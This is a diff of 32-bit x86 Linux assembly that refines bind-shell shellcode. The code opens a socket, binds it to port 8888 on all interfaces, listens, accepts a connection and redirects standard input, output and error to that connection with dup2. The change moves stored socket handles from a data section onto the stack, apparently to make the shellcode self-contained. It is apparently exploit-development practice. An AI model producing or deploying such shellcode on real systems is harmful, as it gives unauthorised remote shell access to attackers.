@@ -44,22 +44,24 @@ _start:
 	mov cl, 1
 	xor edx, edx
 	int 0x80
-	mov dword [socket], eax
-	;push eax
+	push eax
 
 
 	; Bind - 361
 	xor eax, eax
 	mov ax, 0x169
-	mov ebx, [socket]
-	xor edi, edi
-	push dword edi 		; push 0 => ip 0.0.0.0
-    push edi		; port 8888, big endian
+	pop ebx
+	xor ecx, ecx
+	push dword ecx 		; push 0 => ip 0.0.0.0
+    push ecx		; port 8888, big endian
     push word 0xb822 	; port 8888, big endian
     push word 2 
 	mov ecx, esp
 	xor edx, edx
 	mov dl, 0x10 ; 16 
+
+	push ebx
+	
 	int 0x80
 
 
@@ -70,7 +72,8 @@ _start:
 	; ) =  0;
 	xor eax, eax
 	mov ax, 0x16b
-	mov ebx, [socket]
+	pop ebx
+	push ebx
 	xor ecx, ecx
 	int 0x80
 
@@ -85,31 +88,37 @@ _start:
 	; ) =  19;
 	xor eax, eax
 	mov ax, 0x16c
-	mov ebx, [socket]
+	pop ebx
 	xor ecx, ecx
 	xor edx, edx
 	mov dl, 0x10 ; 16 
 	int 0x80
-	mov [accept_res], eax
+	;mov [accept_res], eax
+	push eax
 
 
 	;dup2 - 0
 	xor eax, eax
 	mov al, 0x3f
-	mov ebx, [accept_res]
+	;mov ebx, [accept_res]
+	pop ebx
+	push ebx
 	xor ecx, ecx
 	int 0x80
 	;dup2 - 1
 	xor eax, eax
 	mov al, 0x3f
-	mov ebx, [accept_res]
+	pop ebx
+	push ebx
+	;mov ebx, [accept_res]
 	xor ecx, ecx
 	mov cl, 1
 	int 0x80
 	;dup2 - 2
 	xor eax, eax
 	mov al, 0x3f
-	mov ebx, [accept_res]
+	;mov ebx, [accept_res]
+	pop ebx
 	xor ecx, ecx
 	mov cl, 2
 	int 0x80
@@ -129,7 +138,6 @@ _start:
 	int 0x80
 
 
-section .bss
-	socket resd 1
-	socket_address resd 2
-	accept_res	resd 1
+;section .bss
+;	socket resd 1
+;	accept_res	resd 1
